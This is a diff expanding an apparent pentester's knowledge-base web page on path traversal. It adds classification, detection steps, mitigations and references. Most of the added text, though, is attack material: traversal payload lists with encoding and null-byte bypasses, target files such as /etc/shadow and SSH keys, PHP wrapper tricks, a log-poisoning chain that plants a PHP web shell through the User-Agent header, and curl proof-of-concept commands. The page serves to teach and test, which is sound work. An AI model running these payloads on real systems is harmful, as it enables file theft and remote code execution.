@@ -28,16 +28,31 @@
     .severity-badge { display: inline-block; background: rgba(255, 153, 0, 0.2); color: #ff9900; padding: 0.3rem 1rem; border-radius: 40px; font-size: 0.75rem; font-weight: 600; margin-bottom: 1rem; }
     .content-section { margin: 2rem 0; }
     .content-section h2 { font-size: 1.5rem; margin: 1.5rem 0 1rem; color: var(--primary); border-left: 3px solid var(--primary); padding-left: 1rem; }
+    .content-section h3 { font-size: 1.2rem; margin: 1rem 0 0.5rem; }
+    .content-section p { margin-bottom: 1rem; color: var(--text-secondary); }
+    .content-section ul, .content-section ol { margin: 1rem 0 1.5rem 2rem; color: var(--text-secondary); }
+    .content-section li { margin-bottom: 0.5rem; }
     .code-block { background: var(--bg-card); border: 1px solid var(--border); border-radius: 0.75rem; padding: 1.2rem; margin: 1.5rem 0; overflow-x: auto; font-family: 'Courier New', monospace; font-size: 0.85rem; color: var(--primary); position: relative; }
     .copy-btn { position: absolute; top: 0.5rem; right: 0.5rem; background: var(--bg-elevated); border: none; padding: 0.2rem 0.5rem; border-radius: 4px; cursor: pointer; color: var(--text-secondary); font-size: 0.7rem; }
     .copy-btn:hover { color: var(--primary); }
+    .payload-category { margin: 1.5rem 0 1rem; padding: 0.5rem; background: var(--bg-elevated); border-radius: 8px; font-weight: 700; color: var(--primary); }
     .payload-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(400px, 1fr)); gap: 0.8rem; margin: 1rem 0; }
     .payload-item { background: var(--bg-elevated); border: 1px solid var(--border); border-radius: 0.5rem; padding: 0.7rem; font-family: monospace; font-size: 0.75rem; word-break: break-all; }
     .vulnerability-box { background: rgba(255, 153, 0, 0.1); border-left: 4px solid #ff9900; padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
     .mitigation-box { background: rgba(0, 245, 160, 0.1); border-left: 4px solid var(--primary); padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
     .back-link { display: inline-flex; align-items: center; gap: 0.5rem; margin-top: 2rem; color: var(--primary); text-decoration: none; }
     footer { text-align: center; padding: 2rem; border-top: 1px solid var(--border); color: var(--text-secondary); font-size: 0.8rem; }
-    @media (max-width: 768px) { .container { padding: 0 1rem; } .mobile-menu { display: block; } .nav-links { display: none; width: 100%; flex-direction: column; padding: 1rem 0; gap: 1rem; } .nav-links.show { display: flex; } .page-header h1 { font-size: 1.8rem; } .payload-grid { grid-template-columns: 1fr; } }
+    .test-cases { width: 100%; border-collapse: collapse; background: var(--bg-card); border: 1px solid var(--border); margin: 1rem 0; }
+    .test-cases th, .test-cases td { padding: 0.75rem; text-align: left; border-bottom: 1px solid var(--border); }
+    .test-cases th { background: var(--bg-elevated); color: var(--primary); }
+    @media (max-width: 768px) {
+      .container { padding: 0 1rem; }
+      .mobile-menu { display: block; }
+      .nav-links { display: none; width: 100%; flex-direction: column; padding: 1rem 0; gap: 1rem; }
+      .nav-links.show { display: flex; }
+      .page-header h1 { font-size: 1.8rem; }
+      .payload-grid { grid-template-columns: 1fr; }
+    }
   </style>
 </head>
 <body>
@@ -49,6 +64,7 @@
     <ul class="nav-links" id="navLinks">
       <li><a href="../index.html">Resume</a></li>
       <li><a href="../knowledge-base.html">Knowledge Base</a></li>
+      <li><a href="../status.html">Status</a></li>
       <li><a href="../blog.html">Write-ups</a></li>
       <li><a href="../tools.html">Tools</a></li>
       <li><a href="../index.html#contact">Contact</a></li>
@@ -61,88 +77,284 @@
   <div class="container">
     <div class="breadcrumb"><a href="../knowledge-base.html">Knowledge Base</a> / <a href="index.html">Web Security</a> / Path Traversal</div>
     <div class="page-header">
-      <span class="severity-badge"><i class="fas fa-exclamation-triangle"></i> High Severity | OWASP A01:2021</span>
-      <h1>📌 Path Traversal (Directory Traversal)</h1>
+      <span class="severity-badge"><i class="fas fa-exclamation-triangle"></i> High Severity</span>
+      <h1>📌 Path Traversal (Directory Traversal) – Complete Guide</h1>
+      <p>Accessing files outside the web root by manipulating file path inputs. Linux, Windows, encoding bypasses, PHP wrappers, and log poisoning.</p>
     </div>
 
+    <!-- ==================== DESCRIPTION ==================== -->
     <div class="content-section">
       <h2>🧠 Description</h2>
       <p><strong>What is Path Traversal?</strong></p>
-      <p>Path Traversal allows attackers to access files and directories stored outside the web root folder. By manipulating variables that reference files with "../" sequences, attackers can read arbitrary files on the server.</p>
+      <p>Path Traversal (also known as Directory Traversal) is a web vulnerability that allows attackers to access files and directories stored outside the web root folder. By manipulating variables that reference files with <code>../</code> (dot-dot-slash) sequences and their variants, attackers can read arbitrary files on the server, including source code, configuration files, credentials, and system files.</p>
+      <p><strong>Why does it occur?</strong></p>
+      <p>Insufficient input validation and sanitisation when handling file paths. The application trusts user-supplied input and uses it directly in file system operations without proper checks.</p>
+      <p><strong>Security principle violated:</strong> Input Validation / Access Control</p>
     </div>
 
+    <!-- ==================== CLASSIFICATION ==================== -->
     <div class="content-section">
-      <h2>🎯 Attack Surface</h2>
+      <h2>🏷️ Classification</h2>
       <ul>
-        <li>✅ File download parameters (<code>?file=</code>, <code>?path=</code>)</li>
-        <li>✅ Template inclusion (<code>?page=</code>)</li>
-        <li>✅ Image upload paths</li>
-        <li>✅ Backup/download functionality</li>
+        <li><strong>Type:</strong> Path Traversal / Directory Traversal</li>
+        <li><strong>OWASP:</strong> A01:2021 – Broken Access Control</li>
+        <li><strong>CWE:</strong> CWE-22: Improper Limitation of a Pathname to a Restricted Directory</li>
       </ul>
     </div>
 
+    <!-- ==================== ATTACK SURFACE ==================== -->
     <div class="content-section">
-      <h2>💣 Basic Payloads</h2>
-      <div class="payload-grid">
-        <div class="payload-item">../../../etc/passwd</div>
-        <div class="payload-item">..\..\..\windows\win.ini</div>
-        <div class="payload-item">....//....//....//etc/passwd</div>
-        <div class="payload-item">..;/..;/..;/etc/passwd</div>
-        <div class="payload-item">%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd</div>
-        <div class="payload-item">..%252f..%252f..%252fetc%252fpasswd</div>
-        <div class="payload-item">....\/....\/....\/etc/passwd</div>
-        <div class="payload-item">..%c0%af..%c0%af..%c0%afetc/passwd</div>
-      </div>
+      <h2>🎯 Attack Surface (Where to Test)</h2>
+      <ul>
+        <li>✅ File download parameters (<code>?file=</code>, <code>?path=</code>, <code>?doc=</code>, <code>?page=</code>)</li>
+        <li>✅ Template inclusion (<code>?template=</code>, <code>?theme=</code>)</li>
+        <li>✅ Image/PDF generation from file paths</li>
+        <li>✅ Log file viewers</li>
+        <li>✅ Backup/download functionality</li>
+        <li>✅ Language file selection (<code>?lang=</code>)</li>
+      </ul>
+    </div>
 
-      <div class="payload-category">🎯 Common Target Files</div>
+    <!-- ==================== DETECTION METHODOLOGY ==================== -->
+    <div class="content-section">
+      <h2>🔍 Detection Methodology</h2>
+      <h3>1. Static Analysis</h3>
+      <ul>
+        <li>Search for file read functions: <code>file_get_contents()</code>, <code>fopen()</code>, <code>readfile()</code>, <code>include()</code>, <code>require()</code></li>
+        <li>Check if user input is passed directly to these functions without sanitisation</li>
+      </ul>
+      <h3>2. Dynamic Analysis (Burp Suite / Manual)</h3>
+      <ul>
+        <li>Inject <code>../../../etc/passwd</code> in parameters</li>
+        <li>Observe response for file contents or error messages</li>
+        <li>Try different traversal depths (<code>../</code> repeated)</li>
+        <li>Test encoding variations if basic is filtered</li>
+      </ul>
+      <p><strong>Tools:</strong> Burp Suite, dotdotpwn, ffuf, OWASP ZAP</p>
+    </div>
+
+    <!-- ==================== TYPES OF ATTACKS ==================== -->
+    <div class="content-section">
+      <h2>📂 Types of Path Traversal Attacks</h2>
+      <ul>
+        <li><strong>Local File Inclusion (LFI):</strong> Reading local files (source code, config, passwords)</li>
+        <li><strong>Source Code Disclosure:</strong> Exposing application source code via PHP wrappers</li>
+        <li><strong>Log Poisoning (LFI to RCE):</strong> Injecting malicious code into logs then including them</li>
+        <li><strong>Directory Listing:</strong> Enumerating directory contents (if directory listing is enabled)</li>
+      </ul>
+    </div>
+
+    <!-- ==================== TARGET FILES ==================== -->
+    <div class="content-section">
+      <h2>📁 Common Target Files</h2>
       <div class="payload-grid">
         <div class="payload-item">/etc/passwd</div>
         <div class="payload-item">/etc/shadow</div>
         <div class="payload-item">/etc/hosts</div>
-        <div class="payload-item">/proc/self/environ</div>
+        <div class="payload-item">/etc/apache2/apache2.conf</div>
         <div class="payload-item">/var/www/html/config.php</div>
-        <div class="payload-item">c:\windows\win.ini</div>
-        <div class="payload-item">c:\boot.ini</div>
+        <div class="payload-item">/var/www/html/.env</div>
+        <div class="payload-item">/proc/self/environ</div>
         <div class="payload-item">/root/.ssh/id_rsa</div>
         <div class="payload-item">/home/user/.bash_history</div>
-      </div>
-
-      <div class="payload-category">🔧 WAF Bypass Techniques</div>
-      <div class="payload-grid">
-        <div class="payload-item">....//....//....//etc/passwd</div>
-        <div class="payload-item">..;/..;/..;/etc/passwd</div>
-        <div class="payload-item">..%00/..%00/..%00/etc/passwd</div>
-        <div class="payload-item">..%2500/..%2500/..%2500/etc/passwd</div>
+        <div class="payload-item">c:\windows\win.ini</div>
+        <div class="payload-item">c:\boot.ini</div>
+        <div class="payload-item">c:\windows\system32\drivers\etc\hosts</div>
       </div>
     </div>
 
+    <!-- ==================== BASIC PAYLOADS ==================== -->
+    <div class="content-section">
+      <h2>💣 Basic Payloads (Linux & Windows)</h2>
+      <div class="payload-grid">
+        <div class="payload-item">../../../etc/passwd</div>
+        <div class="payload-item">..\..\..\windows\win.ini</div>
+        <div class="payload-item">../../../../var/www/html/config.php</div>
+        <div class="payload-item">....//....//....//etc/passwd</div>
+        <div class="payload-item">..;/..;/..;/etc/passwd</div>
+      </div>
+    </div>
+
+    <!-- ==================== ENCODING & BYPASS ==================== -->
+    <div class="content-section">
+      <h2>🚀 Encoding & Bypass Techniques</h2>
+      <div class="payload-category">URL Encoding</div>
+      <div class="payload-grid">
+        <div class="payload-item">%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd</div>
+        <div class="payload-item">%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd</div>
+        <div class="payload-item">..%2f..%2f..%2fetc%2fpasswd</div>
+      </div>
+      <div class="payload-category">Double URL Encoding</div>
+      <div class="payload-grid">
+        <div class="payload-item">%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd</div>
+        <div class="payload-item">..%252f..%252f..%252fetc%252fpasswd</div>
+      </div>
+      <div class="payload-category">Unicode / Overlong UTF-8</div>
+      <div class="payload-grid">
+        <div class="payload-item">..%c0%af..%c0%af..%c0%afetc/passwd</div>
+        <div class="payload-item">..%c1%9c..%c1%9c..%c1%9cetc/passwd</div>
+      </div>
+      <div class="payload-category">Nested Traversal</div>
+      <div class="payload-grid">
+        <div class="payload-item">....//....//....//etc/passwd</div>
+        <div class="payload-item">....\/....\/....\/etc/passwd</div>
+      </div>
+      <div class="payload-category">Null Byte Injection (PHP < 5.3.4)</div>
+      <div class="payload-grid">
+        <div class="payload-item">../../../etc/passwd%00</div>
+        <div class="payload-item">../../../etc/passwd%00.jpg</div>
+      </div>
+      <div class="payload-category">Absolute Paths (No Traversal Needed)</div>
+      <div class="payload-grid">
+        <div class="payload-item">/etc/passwd</div>
+        <div class="payload-item">C:\windows\win.ini</div>
+      </div>
+    </div>
+
+    <!-- ==================== PHP WRAPPERS (LFI to RCE) ==================== -->
+    <div class="content-section">
+      <h2>🐘 PHP Wrappers – Source Code Disclosure & RCE</h2>
+      <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Read source code (Base64 encoded)
+php://filter/convert.base64-encode/resource=index.php
+php://filter/read=convert.base64-encode/resource=config.php
+
+# Zip wrapper (requires zip file upload)
+zip://path/to/file.zip%23rce.php
+
+# Phar wrapper
+phar://path/to/file.phar/test.txt
+
+# Expect wrapper (if enabled – RCE)
+expect://id</pre>
+      </div>
+    </div>
+
+    <!-- ==================== LOG POISONING (LFI to RCE) ==================== -->
+    <div class="content-section">
+      <h2>🔥 Log Poisoning – LFI to Remote Code Execution</h2>
+      <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Step 1: Inject malicious PHP code into User-Agent
+User-Agent: &lt;?php system($_GET['cmd']); ?&gt;
+
+# Step 2: Include the log file
+?file=../../../../var/log/apache2/access.log&cmd=id
+
+# Step 3: Execute commands via the injected parameter
+?file=../../../../var/log/apache2/access.log&cmd=whoami</pre>
+      </div>
+      <p><strong>Common log file paths:</strong></p>
+      <ul>
+        <li><code>/var/log/apache2/access.log</code></li>
+        <li><code>/var/log/apache2/error.log</code></li>
+        <li><code>/var/log/nginx/access.log</code></li>
+        <li><code>/var/log/nginx/error.log</code></li>
+        <li><code>/proc/self/environ</code> (if readable)</li>
+      </ul>
+    </div>
+
+    <!-- ==================== WINDOWS SPECIFIC ==================== -->
+    <div class="content-section">
+      <h2>🪟 Windows Exploitation Techniques</h2>
+      <div class="payload-grid">
+        <div class="payload-item">..\..\..\windows\win.ini</div>
+        <div class="payload-item">..\..\..\windows\system32\drivers\etc\hosts</div>
+        <div class="payload-item">..\..\..\boot.ini</div>
+        <div class="payload-item">..\..\..\windows\repair\sam</div>
+        <div class="payload-item">..\..\..\windows\repair\system</div>
+      </div>
+    </div>
+
+    <!-- ==================== TEST CASES ==================== -->
+    <div class="content-section">
+      <h2>🧪 Test Cases (STRICT)</h2>
+      <table class="test-cases">
+        <thead><tr><th>Step</th><th>Action</th><th>Expected</th><th>Actual</th></tr></thead>
+        <tbody>
+          <tr><td style="padding: 0.75rem;">1</td><td style="padding: 0.75rem;">Inject <code>../../../etc/passwd</code></td><td style="padding: 0.75rem;">File content or error</td><td style="padding: 0.75rem;">/etc/passwd displayed</td></tr>
+          <tr><td style="padding: 0.75rem;">2</td><td style="padding: 0.75rem;">Inject <code>..%2f..%2f..%2fetc%2fpasswd</code></td><td style="padding: 0.75rem;">File content</td><td style="padding: 0.75rem;">Encoding bypass works</td></tr>
+          <tr><td style="padding: 0.75rem;">3</td><td style="padding: 0.75rem;">Inject <code>../../../etc/passwd%00</code></td><td style="padding: 0.75rem;">File content</td><td style="padding: 0.75rem;">Null byte bypass</td></tr>
+          <tr><td style="padding: 0.75rem;">4</td><td style="padding: 0.75rem;">PHP wrapper: <code>php://filter/convert.base64-encode/resource=index.php</code></td><td style="padding: 0.75rem;">Base64 source</td><td style="padding: 0.75rem;">Source code disclosure</td></tr>
+        </tbody>
+      </table>
+      <p>✔ Must be reproducible</p>
+    </div>
+
+    <!-- ==================== EXPLOITATION STEPS ==================== -->
     <div class="content-section">
       <h2>⚙️ Exploitation Steps</h2>
       <ol>
-        <li>Identify file inclusion parameter</li>
-        <li>Inject ../ sequences to traverse directories</li>
-        <li>Attempt to read /etc/passwd</li>
-        <li>Use encoding if filtered</li>
-        <li>Discover source code, configs, credentials</li>
+        <li>Identify a file inclusion parameter (<code>?file=</code>, <code>?path=</code>, <code>?page=</code>).</li>
+        <li>Inject <code>../../../etc/passwd</code> and observe response.</li>
+        <li>If blocked, try encoding variants (URL, double URL, Unicode).</li>
+        <li>Try absolute paths (<code>/etc/passwd</code>).</li>
+        <li>Use PHP wrappers to read source code (<code>php://filter</code>).</li>
+        <li>Attempt log poisoning by injecting PHP code into User-Agent, then include the log file.</li>
+        <li>Escalate to RCE by executing commands via the injected code.</li>
       </ol>
     </div>
 
+    <!-- ==================== MITIGATION ==================== -->
     <div class="content-section">
       <h2>🛡️ Mitigation</h2>
       <div class="mitigation-box">
-        <strong>✅ Use allowlist for allowed files</strong><br>
-        <strong>✅ Store files outside web root</strong><br>
-        <strong>✅ Validate input against allowlist</strong><br>
-        <strong>✅ Use chrooted environments</strong><br>
-        <strong>✅ Disable unnecessary file system access</strong>
+        <strong>✅ Use allowlist of allowed files:</strong> Only permit specific filenames, never user‑controlled paths.<br>
+        <strong>✅ Store files outside web root:</strong> Keep static files in a directory not accessible via URL.<br>
+        <strong>✅ Disable dangerous PHP wrappers:</strong> Set <code>allow_url_fopen = Off</code> and <code>allow_url_include = Off</code>.<br>
+        <strong>✅ Use chrooted environments:</strong> Restrict the application to a jailed directory.<br>
+        <strong>✅ Normalise input:</strong> Remove <code>../</code>, <code>..\</code>, and encoded variants before processing.<br>
+        <strong>✅ Apply principle of least privilege:</strong> Run web server with limited user permissions.<br>
+        <strong>✅ Regular security audits:</strong> Scan for path traversal vulnerabilities using automated tools.
       </div>
     </div>
 
+    <!-- ==================== RISK / IMPACT ==================== -->
+    <div class="content-section">
+      <h2>⚠️ Risk / Impact</h2>
+      <div class="vulnerability-box">
+        <strong>Severity: High</strong><br><br>
+        <strong>Impact:</strong>
+        <ul>
+          <li>Disclosure of sensitive files (/etc/passwd, /etc/shadow, application source code, database credentials)</li>
+          <li>Source code exposure (leading to further vulnerabilities)</li>
+          <li>Potential Remote Code Execution (via log poisoning or PHP wrappers)</li>
+          <li>Leakage of internal network information (/etc/hosts, /proc/net)</li>
+        </ul>
+      </div>
+    </div>
+
+    <!-- ==================== PROOF OF CONCEPT ==================== -->
+    <div class="content-section">
+      <h2>📎 Proof of Concept (PoC)</h2>
+      <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Basic path traversal
+curl "https://target.com/download?file=../../../../etc/passwd"
+
+# URL encoded
+curl "https://target.com/download?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+
+# PHP wrapper to read source code
+curl "https://target.com/index.php?page=php://filter/convert.base64-encode/resource=config"
+
+# Log poisoning (inject PHP into User-Agent)
+curl -H "User-Agent: &lt;?php system(\$_GET['cmd']); ?&gt;" "https://target.com/"
+# Then include the log
+curl "https://target.com/index.php?page=../../../../var/log/apache2/access.log&cmd=id"
+
+# Automated scanning with dotdotpwn
+dotdotpwn -m http -u "https://target.com/download?file=TRAVERSAL" -k "root:x"</pre>
+      </div>
+    </div>
+
+    <!-- ==================== REFERENCES ==================== -->
     <div class="content-section">
       <h2>📚 References</h2>
       <ul>
-        <li><a href="https://portswigger.net/web-security/file-path-traversal" class="reference-link" target="_blank">PortSwigger: Path Traversal</a></li>
-        <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal" class="reference-link" target="_blank">PayloadsAllTheThings: Directory Traversal</a></li>
+        <li><a href="https://portswigger.net/web-security/file-path-traversal" class="reference-link" target="_blank" style="color: var(--primary);">PortSwigger – Path Traversal</a></li>
+        <li><a href="https://owasp.org/www-community/attacks/Path_Traversal" class="reference-link" target="_blank" style="color: var(--primary);">OWASP – Path Traversal</a></li>
+        <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal" class="reference-link" target="_blank" style="color: var(--primary);">PayloadsAllTheThings – Directory Traversal</a></li>
+        <li><a href="https://hackingarticles.in/comprehensive-guide-on-path-traversal/" class="reference-link" target="_blank" style="color: var(--primary);">HackingArticles – Complete Path Traversal Guide</a></li>
+        <li><a href="https://github.com/klezVirus/dotdotpwn" class="reference-link" target="_blank" style="color: var(--primary);">dotdotpwn – Path Traversal Fuzzer</a></li>
       </ul>
     </div>
 
@@ -150,7 +362,7 @@
   </div>
 </main>
 
-<footer><p>Saikumar Raju — Cybersecurity Consultant | Path Traversal - Complete Guide</p></footer>
+<footer><p>Saikumar Raju — Cybersecurity Consultant | Path Traversal – Complete Guide</p></footer>
 
 <script>
   const mobileBtn = document.getElementById('mobileMenuBtn');
